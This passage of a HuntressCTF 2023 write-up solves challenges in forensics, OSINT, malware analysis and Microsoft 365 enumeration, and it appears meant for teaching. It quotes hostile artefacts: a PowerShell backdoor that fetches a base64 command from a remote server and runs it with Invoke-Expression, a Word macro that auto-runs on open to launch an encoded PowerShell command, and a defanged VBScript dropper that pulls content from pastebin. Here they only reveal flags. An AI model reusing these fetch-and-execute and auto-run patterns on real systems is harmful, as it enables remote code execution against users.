# Windows Version and Build #
#
$WindowsInfo = Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion"
# $PORT below is dynamic to the running service of the `Start` button
$OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
if ($html -match '<!--(.*?)-->') {
    $value = $matches[1]
    $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($value))
    Invoke-Expression $command
})

# (snip)
```

Sending request with the above token.

```console
root@kali:~/ctf/HuntressCTF# curl -D- http://chal.ctf.games:31971 -H "Authorization: Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg=="
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 69

<!-- ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ== -->

root@kali:~/ctf/HuntressCTF# echo -ne 'ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ==' | base64 -d
echo flag{60bb3bfaf703e0fa36730ab70e115bd7}
```

## Dumpster Fire

### Description

> We found all this data in the dumpster! Can you find anything interesting in here, like any cool passwords or anything? Check it out quick before the foxes get to it!
>
> Download the file(s) below.
>
> Attachments: dumpster_fire.tar.xz

### Flag

flag{35446041dc161cf5c9c325a3d28af3e3}

### Solution

Dumped password in Firefox Profile directory by using [Firefox Decrypt](https://github.com/unode/firefox_decrypt).

```console
root@kali:~/ctf/HuntressCTF# mkdir tmp && tar xJf dumpster_fire.tar.xz -C tmp

root@kali:~/ctf/HuntressCTF# git clone https://github.com/unode/firefox_decrypt.git
(snip)
root@kali:~/ctf/HuntressCTF# python3 firefox_decrypt/firefox_decrypt.py tmp/home/challenge/.mozilla/firefox/bc1m1zlr.default-release
2023-10-08 22:13:26,154 - WARNING - profile.ini not found in tmp/home/challenge/.mozilla/firefox/bc1m1zlr.default-release
2023-10-08 22:13:26,155 - WARNING - Continuing and assuming 'tmp/home/challenge/.mozilla/firefox/bc1m1zlr.default-release' is a profile location

Website:   http://localhost:31337
Username: 'flag'
Password: 'flag{35446041dc161cf5c9c325a3d28af3e3}'
```

## Comprezz

### Description

> Someone stole my S's and replaced them with Z's! Have you ever seen this kind of file before?
>
> Download the file(s) below.
>
> Attachments: comprezz

### Flag

flag{196a71490b7b55c42bf443274f9ff42b}

### Solution

```console
root@kali:~/ctf/HuntressCTF# file comprezz
comprezz: compress'd data 16 bits

root@kali:~/ctf/HuntressCTF# cat comprezz | uncompress
flag{196a71490b7b55c42bf443274f9ff42b}
```

## Chicken Wings

### Description

> ordered chicken wings at the local restaurant, but uh... this really isn't what I was expecting...
>
> Download the file(s) below.
>
> Attachments: chicken_wings

### Flag

flag{e0791ce68f718188c0378b1c0a3bdc9e}

### Solution

```console
root@kali:~/ctf/HuntressCTF# file chicken_wings
chicken_wings: Unicode text, UTF-8 text, with no line terminators

root@kali:~/ctf/HuntressCTF# cat chicken_wings
♐●♋♑❀♏📁🖮🖲📂♍♏⌛🖰♐🖮📂🖰📂🖰🖰♍📁🗏🖮🖰♌📂♍📁♋🗏♌♎♍🖲♏❝
```

Used [Wingdings Font Translator](https://www.dcode.fr/wingdings-font), got flag.

## Where am I?

### Description

> Your friend thought using a JPG was a great way to remember how to login to their private server. Can you find the flag?
>
> Download the file(s) below.
>
> Attachments: PXL_20230922_231845140_2.jpg

### Flag

flag{b11a3f0ef4bc170ba9409c077355bba2}

### Solution

```console
root@kali:~/ctf/HuntressCTF# file PXL_20230922_231845140_2.jpg
PXL_20230922_231845140_2.jpg: JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=14, height=4000, description=ZmxhZ3tiMTFhM2YwZWY0YmMxNzBiYTk0MDljMDc3MzU1YmJhMik=, manufacturer=Google, model=Pixel Fold, orientation=upper-left, xresolution=260, yresolution=268, resolutionunit=2, software=HDR+ 1.0.540104767zd, datetime=2023:09:22 19:18:45, GPS-Data, width=3000], baseline, precision 8, 3000x4000, components 3

root@kali:~/ctf/HuntressCTF# echo -ne 'ZmxhZ3tiMTFhM2YwZWY0YmMxNzBiYTk0MDljMDc3MzU1YmJhMik=' | base64 -d | sed -e 's/)/}/'
flag{b11a3f0ef4bc170ba9409c077355bba2}
```

## F12

### Description

> Remember when Missouri got into hacking!?! You gotta be fast to catch this flag!
>
> Press the Start button on the top-right to begin this challenge.

### Flag

flag{03e8ba07d1584c17e69ac95c341a2569}

### Solution

```console
root@kali:~/ctf/HuntressCTF# curl -s http://chal.ctf.games:32522/ | grep -i flag
                <button type="button" onclick="ctf()" class="btn btn-primary"><h1>Capture The Flag</button>
            window.open("./capture_the_flag.html", 'Capture The Flag', 'width=400,height=100%,menu=no,toolbar=no,location=no,scrollbars=yes');

root@kali:~/ctf/HuntressCTF# curl -s http://chal.ctf.games:32522/capture_the_flag.html | grep -i flag
                <button type="button" onclick="ctf()" class="btn btn-success"><h1>Your flag is:<br>
                  flag{03e8ba07d1584c17e69ac95c341a2569}
```

## Wimble

### Description

> "Gretchen, stop trying to make fetch happen! It's not going to happen!" - Regina George, Mean Girls
>
> Download the files below.
>
> Attachments: wimble.7z

### Flag

FLAG{97F33C9783C21DF85D79D613B0B258BD}

### Solution

```console
root@kali:~/ctf/HuntressCTF# 7z e wimble.7z
(snip)
root@kali:~/ctf/HuntressCTF# file fetch
fetch: Windows imaging (WIM) image v1.13, XPRESS compressed, reparse point fixup

root@kali:~/ctf/HuntressCTF# wimlib-imagex info fetch
WIM Information:
----------------
Path:           fetch
GUID:           0x2e2668f5d8e16c4f8b3415b70c02fe86
Version:        68864
Image Count:    1
Compression:    XPRESS
Chunk Size:     32768 bytes
Part Number:    1/1
Boot Index:     0
Size:           6144026 bytes
Attributes:     Relative path junction

Available Images:
-----------------
Index:                  1
Name:                   Fetch
Description:
Directory Count:        1
File Count:             272
Total Bytes:            7337140
Hard Link Bytes:        0
Creation Time:          Wed May 31 09:31:49 2023 UTC
Last Modification Time: Wed May 31 09:31:49 2023 UTC
WIMBoot compatible:     no

root@kali:~/ctf/HuntressCTF# wimlib-imagex dir fetch | less

root@kali:~/ctf/HuntressCTF# wimlib-imagex dir fetch | grep fetch.zip
/fetch.zip

root@kali:~/ctf/HuntressCTF# wimlib-imagex extract fetch 1 fetch.zip
[WARNING] Ignoring FILE_ATTRIBUTE_NOT_CONTENT_INDEXED of 1 files
[WARNING] Ignoring Windows NT security descriptors of 1 files
[WARNING] Ignoring object IDs of 1 files
Extracting file data: 2918 KiB of 2918 KiB (100%) done
Done extracting files.

root@kali:~/ctf/HuntressCTF# file fetch.zip
fetch.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
```

Copied fetch.zip to Windows machine. I used PECmd in [Eric Zimmerman's tools](https://ericzimmerman.github.io/#!index.md).

```console
PS C:\Users\root\Desktop\huntressctf\PECmd> .\PECmd.exe -d C:\Users\root\Desktop\huntressctf\fetch\ --csv .
(snip))
---------- Processed C:\Users\root\Desktop\huntressctf\fetch\WWAHOST.EXE-493FDBE7.pf in 0.63386910 seconds ----------
Processed 257 out of 260 files in 54.5168 seconds

Failed files
  C:\Users\root\Desktop\huntressctf\fetch\DLLHOST.EXE-5A1B6910.pf ==> (Invalid signature! Should be 'SCCA')
  C:\Users\root\Desktop\huntressctf\fetch\MOBSYNC.EXE-B307E1CC.pf ==> (Invalid signature! Should be 'SCCA')
  C:\Users\root\Desktop\huntressctf\fetch\SVCHOST.EXE-04F53BBC.pf ==> (Invalid signature! Should be 'SCCA')

CSV output will be saved to .\20231010133509_PECmd_Output.csv
CSV time line output will be saved to .\20231010133509_PECmd_Output_Timeline.csv
```

Greped `20231010133509_PECmd_Output.csv`, got flag.

```console
$ grep -Eoi 'flag{[0-9a-f]{32}}' 20231010133509_PECmd_Output.csv
FLAG{97F33C9783C21DF85D79D613B0B258BD}
```

FYI: Similer CTF Writeup: [CTFtime.org / Hacktober CTF / Prefetch Perfection / Writeup](https://ctftime.org/writeup/24252)

## VeeBeeEee

### Description

> While investigating a host, we found this strange file attached to a scheduled task. It was invoked with wscript or something... can you find a flag?
>
> NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
>
> Download the file(s) below.
>
> Attachments: veebeeeee

### Flag

flag{ed81d24958127a2adccfb343012cebff}

### Solution

I guess `veebeeeee` is a .vbe (VBScript) file.

1. rename veebeeeee to veebeeeee.vbe
2. upload it to <https://master.ayra.ch/vbs/vbs.aspx> to decrypt and download veebeeeee.vbs

```console
$ cat veebeeeee.vbs | sed -e 's/&//g'
(snip)
Reqest1 = "https://past"''''''''''''''''al37ysoeopm'al37ysoeopm
Reqest2 = "ebin.com/raw"''''''''''''''''al37ysoeopm'al37ysoeopm
Reqest3 = "/SiYGwwcz"''''''''''''''''al37ysoeopm'al37ysoeopm
Reqest4 = "' -ou"''''''''''''''''al37ysoeopm'al37ysoeopm
(snip)
```

Concatenated `Reqest1`, `Reqest2` and `Reqest3` variables, Got `https://pastebin.com/raw/SiYGwwcz` URL.

```console
$ curl https://pastebin.com/raw/SiYGwwcz
<!-- flag{ed81d24958127a2adccfb343012cebff} -->
```

## Baking

### Description

> Do you know how to make cookies? How about HTTP flavored?
>
> Press the Start button in the top-right to begin this challenge.
>
> Connect with:
>
> <http://chal.ctf.games:30484>

### Flag

flag{c36fb6ebdbc2c44e6198bf4154d94ed4}

### Solution

```console
root@kali:~/ctf/HuntressCTF# echo -ne '{"recipe": "Magic Cookies", "time": "1/1/2000, 00:00:00"}' | base64
eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEvMS8yMDAwLCAwMDowMDowMCJ9

root@kali:~/ctf/HuntressCTF# curl -i -s -k -b $'in_oven=eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEvMS8yMDAwLCAwMDowMDowMCJ9' $'http://chal.ctf.games:30484/' | grep -Eo 'flag\{[0-9a-f]{32}\}'
flag{c36fb6ebdbc2c44e6198bf4154d94ed4}
```

## Operation Not Found

### Description

> In the boundless web of data, some corners echo louder than others, whispering tales of innovation, deep knowledge, and fierce competition. On the lush landscapes of <https://osint.golf/>, a corner awaits your discovery... where intellect converges with spirit, and where digital foundations stand alongside storied arenas.
>
> This is the `chall1` challenge for the "HuntressCTF2023" challenges on <https://osint.golf>. It's a lot like Geoguesser if you have ever played :)
>
> - Navigate to OSINT Golf and select the `chall1` challenge.
> - You will see an interface similar to Google Street View, where you can look around and zoom in on your surroundings. Try and determine your location on the map of the earth!
> - Move your mouse over the minimap in the bottom-right corner, and scroll to zoom or click and hold to pan around the map.
> - Click and place your pin-marker on the map where you believe your exact location is. The accuracy radius is 200 meters.
> - Click **Submit**. If you are incorrect, it will say "not here" on the top left. If you are correct, your flag will be displayed in the top-left corner.
> - Copy and paste the flag value into the input box below and submit it to solve this challenge!
>
> Connect here: <https://osint.golf/HuntressCTF2023-chall1/>

### Flag

 flag{c46b7183c9810ec4ddb31b2fdc6a914c}

### Solution

This challenge is OSINT.
Cropped out the images of nearby buildings and image searched.
Found [Crosland Tower](https://news.gatech.edu/news/2019/01/11/georgia-tech-library-opens-refurbished-crosland-tower).

Same Location: <https://maps.app.goo.gl/gR3A9tcTwTy6d57T9>

## Snake Eater

### Description

> Hey Analyst, I've never seen an executable icon that looks like this. I don't like things I'm not familiar with. Can you check it out and see what it's doing?
>
> Archive password: infected
>
> NOTE, this challenge is based off of a real malware sample. Windows Defender will probably identify it as malicious. It is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
>
> Download the file(s) below.
>
> Attachments: snake_eater.7z

### Flag

flag{d1343a2fc5d8427801dd1fd417f12628}

### Solution

- Download [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) and run it
- Create filter `Process Name`, `is`, `snake_eater.exe`
  ![snake_eater_procmon1.png](img/snake_eater_procmon1.png)
- Clear (Ctrl+X) and Capture (Ctrl+E)
- Run `snake_eater.exe`
- Search `flag{` and found `C:\Users\root\AppData\Roaming\LibreOffice\4\user\extensions\shared\registry\com.sun.star.comp.deployment.configuration.PackageRegistryBackend\flag{d1343a2fc5d8427801dd1fd417f12628}` path.
  ![snake_eater_procmon2.png](img/snake_eater_procmon2.png)

## Opendir

### Description

> A threat actor exposed an open directory on the public internet! We could explore their tools for some further intelligence. Can you find a flag they might be hiding?
>
> NOTE: This showcases genuine malware samples found a real opendir. For domain reputation purposes, this is behind Basic Authentication with credentials: opendir:opendir
>
> Press the Start button on the top-right to begin this challenge.

### Flag

flag{9eb4ebf423b4e5b2a88aa92b0578cbd9}

### Solution

Accessed to this challenge URL with `opendir:opendir` credential for Basic Auth.

![opendir_1.png](./img/opendir_1.png)

Downloaded all files with `wget` and greped flag.

```console
root@kali:~/ctf/HuntressCTF# wget -q -r --http-user=opendir --http-passwd=opendir http://chal.ctf.games:31085/

root@kali:~/ctf/HuntressCTF# grep -oE 'flag{[0-9a-f]{32}}' -R .
./chal.ctf.games:31085/sir/64_bit_new/oui.txt:flag{9eb4ebf423b4e5b2a88aa92b0578cbd9}
```

## Under The Bridge

### Description

> Can you find this iconic location?
>
> This is the **chall2** challenge for the "HuntressCTF2023" challenges on <https://osint.golf>. It's a lot like Geoguesser if you have ever played :)
>
> - Navigate to OSINT Golf and select the **chall2** challenge.
> - You will see an interface similar to Google Street View, where you can look around and zoom in on your surroundings. Try and determine your location on the map of the earth!
> - Move your mouse over the minimap in the bottom-right corner, and scroll to zoom or click and hold to pan around the map.
> - Click and place your pin-marker on the map where you believe your exact location is. The accuracy radius is 200 meters.
> - Click Submit. If you are incorrect, it will say "not here" on the top left. If you are correct, your flag will be displayed in the top-left corner.
> - Copy and paste the flag value into the input box below and submit it to solve this challenge!
>
>
> Connect here: <https://osint.golf/HuntressCTF2023-chall2/>

### Flag

flag{fdc8cd4cff2c19e0d1022e78481ddf36}

### Solution

This place is Rick Astley bridge in [the MV](https://youtu.be/dQw4w9WgXcQ?si=JTb6pJncd0hK1qDA&t=8).

Same location: <https://maps.app.goo.gl/VcLg4118jE3SmmgPA>

## Land Before Time

### Description

> This trick is nothing new, you know what to do: iSteg. Look for the tail that's older than time, this Spike, you shouldn't climb.
>
> Download the file(s) below.
>
> Attachments: dinosaurs1.png

### Flag

flag{da1e2bf9951c9eb1c33b1d2008064fee}

### Solution

Used [iSteg](https://github.com/rafiibrahim8/iSteg/releases/tag/v2.1), got flag.

![land_before_time.png](img/land_before_time.png)

## Opposable Thumbs

### Description

> We uncovered a database. Perhaps the flag is right between your fingertips!
>
> NOTE: this flag does NOT follow the standard MD5 hash format, but does have the usual flag{} prefix and suffix.
>
> Download the file(s) below.
>
> Attachments: thumbcache_256.db

### Flag

flag{human_after_all}

### Solution

Used [Thumbcache Viewer](https://thumbcacheviewer.github.io/), got flag.

![opposable_thumbs.png](img/opposable_thumbs.png)

## Rock, Paper, Psychic

### Description

> Wanna play a game of rock, paper, scissors against a computer that can read your mind? Sounds fun, right?
>
> NOTE: this challenge binary is not malicious, but Windows Defender will likely flag it as malicious anyway. Please don't open it anywhere that you don't want a Defender alert triggering.
>
> Download the file(s) below.
>
> Attachments: rock_paper_psychic.7z

### Flag

flag{35bed450ed9ac9fcb3f5f8d547873be9}

### Solution

```console
root@kali:~/ctf/HuntressCTF# 7z e rock_paper_psychic.7z
(snip)
root@kali:~/ctf/HuntressCTF# tree .
.
├── rock_paper_psychic.7z
└── rock_paper_psychic.exe

1 directory, 2 files

root@kali:~/ctf/HuntressCTF# wine ./rock_paper_psychic.exe
[#] Hi! I'm Patch, the Telepathic Computer Program.
[#] Let's play Rock, Paper, Scissors!
[#] I should warn you ahead of time, though.
[#] As I previously mentioned, I'm telepathic. So I can read your mind.
[#] You won't end up beating me.
[#] Still want to play? Alright, you've been warned!
[#] Enter your choice (rock, paper, scissors):
[>] rock
[#] I've made my choice! Now let's play!
[#] Ready?
[#] ROCK
[#] PAPER
[#] SCISSORS
[#] SHOOT!
[#] I chose: paper
[#] You chose: rock
[#] I win!
[#] What's so hard to understand? I. CAN. READ. MINDS.
[?] Do you want to play again? (yes/no)
[yes/no] > yes
[#] Enter your choice (rock, paper, scissors):
[>] paper
[#] I've made my choice! Now let's play!
[#] Ready?
[#] ROCK
[#] PAPER
[#] SCISSORS
[#] SHOOT!
[#] I chose: scissors
[#] You chose: paper
[#] I win!
[#] What's so hard to understand? I. CAN. READ. MINDS.
[?] Do you want to play again? (yes/no)
[yes/no] >
```

I couldn't win no matter how many times I try.
I will try to win by modifying the register with the debugger.

1. In Windows, Download [x64gdb](https://x64dbg.com/) ([download link](https://sourceforge.net/projects/x64dbg/files/snapshots/snapshot_2023-10-05_13-38.zip/download>)) and extract the zip archive
2. Run x64gdb.exe
3. File > Open and Select `rock_paper_psychic.exe`
4. Run
5. Set breakpoint `416BE4`
6. Run
7. Enter `rock` (or `paper`, `scissors`) in prompt
8. Change RAX register
   ![rock_paper_psychic_1.png ](img/rock_paper_psychic_1.png)
9. Run
   ![rock_paper_psychic_2.png](img/rock_paper_psychic_2.png)

## Tragedy Redux

### Description

> We found this file as part of an attack chain that seemed to manipulate file contents to stage a payload. Can you make any sense of it?
>
> Archive password: infected
>
> Download the file(s) below.
> Attachments: tragedy_redux.7z

### Flag

flag{63dcc82c30197768f4d458da12f618bc}

### Solution

```console
root@kali:~/ctf/HuntressCTF/tragedy# 7z -otragedy_redux e tragedy_redux.7z
(snip)
root@kali:~/ctf/HuntressCTF/tragedy# tree tragedy_redux
tragedy_redux
└── tragedy_redux

1 directory, 1 file

root@kali:~/ctf/HuntressCTF/tragedy# file tragedy_redux/tragedy_redux
tragedy_redux/tragedy_redux: Zip archive data, made by v4.5, extract using at least v2.0, last modified, last modified Sun, Jan 01 1980 00:00:00, uncompressed size 1453, method=deflate

root@kali:~/ctf/HuntressCTF/tragedy# unzip tragedy_redux/tragedy_redux
Archive:  tragedy_redux/tragedy_redux
file #1:  bad zipfile offset (local header sig):  0
  inflating: _rels/.rels
  inflating: word/document.xml
  inflating: word/_rels/document.xml.rels
  inflating: word/vbaProject.bin
  inflating: word/theme/theme1.xml
  inflating: word/_rels/vbaProject.bin.rels
  inflating: word/vbaData.xml
  inflating: word/settings.xml
  inflating: word/styles.xml
  inflating: word/webSettings.xml
  inflating: word/fontTable.xml
  inflating: docProps/core.xml
  inflating: docProps/app.xml


root@kali:~/ctf/HuntressCTF/tragedy# file word/vbaProject.bin
word/vbaProject.bin: Composite Document File V2 Document, Cannot read section info

root@kali:~/ctf/HuntressCTF/tragedy# git clone https://github.com/DidierStevens/DidierStevensSuite.git
(snip)
root@kali:~/ctf/HuntressCTF/tragedy# python3 ./DidierStevensSuite/oledump.py word/vbaProject.bin -v -s 3 > vbaProject.vba
```

vbaProject.vba

```vba
Attribute VB_Name = "NewMacros"
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    OatMilk = OatMilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = OatMilk
End Function


Function Bears(Cows)
    Bears = StrReverse(Cows)
End Function

Function Tragedy()

    Dim Apples As String
    Dim Water As String

    If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
        Exit Function
    End If

    Apples = "129128136118131132121118125125049062118127116049091088107132106104116074090126107132106104117072095123095124106067094069094126094139094085086070095139116067096088106065107085098066096088099121094101091126095123086069106126095074090120078078"
    Water = Nuts(Apples)


    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin

End Function

Sub AutoOpen()
    Tragedy
End Sub
```

Implementing Python version:

solver.py

```python
def pears(beets):
    return chr(beets - 17)


def strawberries(grapes):
    return grapes[:3]


def almonds(jelly):
    return jelly[3:]


def nuts(milk):
    oat_milk = ""
    while len(milk) > 0:
        oat_milk += pears(int(strawberries(milk)))
        milk = almonds(milk)

    # same here:
    # oat_milk = ""
    # for i in range(0, len(milk), 3):
    #     oat_milk += chr((int(milk[i : i + 3])) - 17)

    return oat_milk


def tragedy():
    apples = "129128136118131132121118125125049062118127116049091088107132106104116074090126107132106104117072095123095124106067094069094126094139094085086070095139116067096088106065107085098066096088099121094101091126095123086069106126095074090120078078"
    water = nuts(apples)

    print(water)


def auto_open():
    tragedy()


if __name__ == "__main__":
    auto_open()
```

```console
root@kali:~/ctf/HuntressCTF/tragedy# python3 solver.py
powershell -enc JGZsYWc9ImZsYWd7NjNkY2M4MmMzMDE5Nzc2OGY0ZDQ1OGRhMTJmNjE4YmN9Ig==

root@kali:~/ctf/HuntressCTF/tragedy# echo -ne 'JGZsYWc9ImZsYWd7NjNkY2M4MmMzMDE5Nzc2OGY0ZDQ1OGRhMTJmNjE4YmN9Ig==' | base64 -d
$flag="flag{63dcc82c30197768f4d458da12f618bc}"
```

## Rogue Inbox

### Description

> You've been asked to audit the Microsoft 365 activity for a recently onboarded as a customer of your MSP.
>
> Your new customer is afraid that Debra was compromised. We received logs exported from Purview... can you figure out what the threat actor did? It might take some clever log-fu!
>
> Download the file(s) below.
> Attachments: purview.csv

### Flag

flag{24c4230fa7d50eef392b2c850f74b0f6}

### Solution

```console
root@kali:~/ctf/HuntressCTF# grep flag@ctf.com purview.csv | grep -o '757cb79-dd91-4555-a45e-520c2525d932\\\\[a-zA-Z0-9{}]' | rev | cut -c1 | tr -d '\n'
flag{24c4230fa7d50eef392b2c850f74b0f6}
```

## M Three Sixty Five

In `M Three Sixty Five` challenge series, it provides the environment in which [AADInternals](https://aadinternals.com/aadinternals/) was setup.

### M Three Sixty Five - Start Here

#### Description

> M Three Sixty Five - Start Here
>
> NOTE: This is the challenge portal that will start the deployable container environment for the "M Three Sixty Five" challenge set below.
>
> There is no flag for this challenge itself.
>
> Connect with SSH, with username user and SSH password userpass. Your syntax may look like: ssh <user@chal.ctf.games> -p [PORTNUMBER]
>
> When you connect to the session for the very first time, you will be authenticated into a Microsoft 365 environment. WARNING: Once you disconnect, you will need to restart your container to reauthenticate Press the Start button on the top-right to begin this challenge.

### M Three Sixty Five - General Info

#### Description

> Welcome to our hackable M365 tenant! Can you find any juicy details, like perhaps the street address this organization is associated with?

#### Flag

flag{dd7bf230fde8d4836917806aff6a6b27}

#### Solution

```console
PS /home/user> Get-AADIntTenantDetails

odata.type                                : Microsoft.DirectoryServices.TenantDetail
objectType                                : Company
objectId                                  : 05985beb-42bc-4c24-bf49-c1730a825406
deletionTimestamp                         :
assignedPlans                             : {@{assignedTimestamp=09/16/2023 06:40:21; capabilityStatus=Enabled; service=exchange; servicePlanId=9f431833-0334-42de-a7dc-70aa40db46db}, @{assignedTimestamp=09/16/2023 06:40:21; capabilitySta
                                            tus=Enabled; service=exchange; servicePlanId=5136a095-5cf0-4aff-bec3-e84448b38ea5}, @{assignedTimestamp=09/16/2023 06:40:17; capabilityStatus=Enabled; service=M365LabelAnalytics; servicePlanId=
                                            d9fa6af4-e046-4c89-9226-729a0786685d}, @{assignedTimestamp=09/16/2023 06:40:19; capabilityStatus=Enabled; service=MicrosoftCommunicationsOnline; servicePlanId=0feaeb32-d00e-4d66-bd5a-43b5b83db8
                                            2c}…}
authorizedServiceInstance                 : {exchange/namprd04-012-01, ccibotsprod/NA001, YammerEnterprise/NA030, WhiteboardServices/NA001…}
city                                      : Ellicott City
cloudRtcUserPolicies                      :
companyLastDirSyncTime                    :
companyTags                               : {o365.microsoft.com/startdate=638304432108764015, azure.microsoft.com/developer365=active, o365.microsoft.com/version=15, o365.microsoft.com/signupexperience=GeminiSignUpUI}
compassEnabled                            :
country                                   :
countryLetterCode                         : US
dirSyncEnabled                            :
displayName                               : HuntressCTF
isMultipleDataLocationsForServicesEnabled :
marketingNotificationEmails               : {}
postalCode                                : 21043
preferredLanguage                         : en
privacyProfile                            :
provisionedPlans                          : {@{capabilityStatus=Enabled; provisioningStatus=Success; service=exchange}, @{capabilityStatus=Enabled; provisioningStatus=Success; service=exchange}, @{capabilityStatus=Enabled; provisioningSt
                                            atus=Success; service=exchange}, @{capabilityStatus=Enabled; provisioningStatus=Success; service=exchange}…}
provisioningErrors                        : {}
releaseTrack                              :
replicationScope                          : NA
securityComplianceNotificationMails       : {}
securityComplianceNotificationPhones      : {}
selfServePasswordResetPolicy              :
state                                     : MD
street                                    : flag{dd7bf230fde8d4836917806aff6a6b27}
technicalNotificationMails                : {huntressctf@outlook.com}
telephoneNumber                           : 8005555555
tenantType                                :
createdDateTime                           : 09/16/2023 06:40:09
verifiedDomains                           : {@{capabilities=Email, OfficeCommunicationsOnline; default=True; id=000520000FC960F2; initial=True; name=4rhdc6.onmicrosoft.com; type=Managed}}
windowsCredentialsEncryptionCertificate   :
```

### M Three Sixty Five - Conditional Access

#### Description

> This tenant looks to have some odd [Conditional Access Policies](https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/overview). Can you find a weird one?

#### Flag

flag{d02fd5f79caa273ea535a526562fd5f7}

#### Solution

```console
PS /home/user> Get-AADIntConditionalAccessPolicies

odata.type          : Microsoft.DirectoryServices.Policy
objectType          : Policy
objectId            : 668225f8-1b04-4c50-ad93-a96234c9e630
deletionTimestamp   :
displayName         : flag{d02fd5f79caa273ea535a526562fd5f7}
keyCredentials      : {}
policyType          : 18
policyDetail        : {{"Version":1,"CreatedDateTime":"2023-10-16T15:23:45.8269524Z","ModifiedDateTime":"2023-10-16T15:38:14.8630673Z","State":"Enabled","Conditions":{"Applications":{"Include":[{"Applications":["None"]}]},"Users":{"Inclu
                      de":[{"Users":["None"]}]}},"Controls":[{"Control":["Mfa"]}],"EnforceAllPoliciesForEas":true,"IncludeOtherLegacyClientTypeForEvaluation":true}}
policyIdentifier    :
tenantDefaultPolicy :

odata.type          : Microsoft.DirectoryServices.Policy
objectType          : Policy
objectId            : 781fecfa-78c7-41b3-9961-fd82132465e3
deletionTimestamp   :
displayName         : Default Policy
keyCredentials      : {}
policyType          : 18
policyDetail        : {{"Version":0,"State":"Disabled"}}
policyIdentifier    : 10/16/2023 15:38:15
tenantDefaultPolicy : 18
```

### M Three Sixty Five - Teams

#### Description

> We observed saw some sensitive information being shared over a Microsoft Teams message! Can you track it down?

#### Flag

flag{f17cf5c1e2e94ddb62b98af0fbbd46e1}

#### Solution

<https://aadinternals.com/aadinternals/#get-aadintteamsmessages-t>

```console
PS /home/user> Get-AADIntTeamsMessages | Format-Table id,content,deletiontime,*type*,DisplayName

Id            Content                                DeletionTime MessageType Type    DisplayName
--            -------                                ------------ ----------- ----    -----------
1695838171758 flag{f17cf5c1e2e94ddb62b98af0fbbd46e1}              Text        Message FNU LNU
```

### M Three Sixty Five - The President

#### Description

> One of the users in this environment seems to have unintentionally left some information in their account details. Can you track down The President?

#### Flag

flag{1e674f0dd1434f2bb3fe5d645b0f9cc3}

#### Solution

```console
PS /home/user> Get-AADIntUsers | Select UserPrincipalName,ObjectId,ImmutableId

UserPrincipalName                       ObjectId                             ImmutableId
-----------------                       --------                             -----------
LeeG@4rhdc6.onmicrosoft.com             0b838a0a-f67c-448b-8731-ee3ddb18a605
AlexW@4rhdc6.onmicrosoft.com            0ce655b4-3623-4931-ad67-7592e8c6ce9c
HuntressCTFAdmin@4rhdc6.onmicrosoft.com 183037f1-027d-4206-84af-95106f08e16c
HackMe@4rhdc6.onmicrosoft.com           32ee9aa5-dc31-4b36-9d38-e514ff8da818
JohannaL@4rhdc6.onmicrosoft.com         38e85aa3-f8c4-417f-b59b-8163f332640d
LynneR@4rhdc6.onmicrosoft.com           578075eb-5400-4fe7-a225-cd8e0f3242f8
HenriettaM@4rhdc6.onmicrosoft.com       6b5d422b-3317-4193-9f38-37b3c700789f
JoniS@4rhdc6.onmicrosoft.com            718bb614-ccf0-48f8-84a2-8df4f09efa14
AdeleV@4rhdc6.onmicrosoft.com           a2f01482-575c-46ae-802a-267392b0cd8f
DiegoS@4rhdc6.onmicrosoft.com           a3527d86-a02c-4cc4-af15-eb89a1825013
LidiaH@4rhdc6.onmicrosoft.com           ab658cc5-fe15-4a7e-8a87-8dda42818a27
NestorW@4rhdc6.onmicrosoft.com          c168db1f-588b-4746-aa22-44396fe83c30
PattiF@4rhdc6.onmicrosoft.com           d15033b7-6556-4bcd-8ec5-0c3f7ff7e9be
PradeepG@4rhdc6.onmicrosoft.com         e65bc282-d8ea-4018-a5b3-3e3f03cdec35
GradyA@4rhdc6.onmicrosoft.com           eec05309-74b1-4e89-a379-9e2199ba9826
MeganB@4rhdc6.onmicrosoft.com           ef935576-05f9-46fd-bf19-995d14926ea1
IsaiahL@4rhdc6.onmicrosoft.com          f1d16e98-cd61-41d8-afea-399b1a6e6323
MiriamG@4rhdc6.onmicrosoft.com          fee33a0e-c6cf-4a34-9ed6-6e4c7bf62521

PS /home/user> Get-AADIntUser -UserPrincipalName "PattiF@4rhdc6.onmicrosoft.com"

AlternateEmailAddresses                :
AlternateMobilePhones                  :
AlternativeSecurityIds                 :
BlockCredential                        : false
City                                   : Louisville
CloudExchangeRecipientDisplayType      : 1073741824
Country                                : United States
Department                             : Executive Management
DirSyncEnabled                         :
DirSyncProvisioningErrors              :
DisplayName                            : Patti Fernandez
Errors                                 :
Fax                                    :
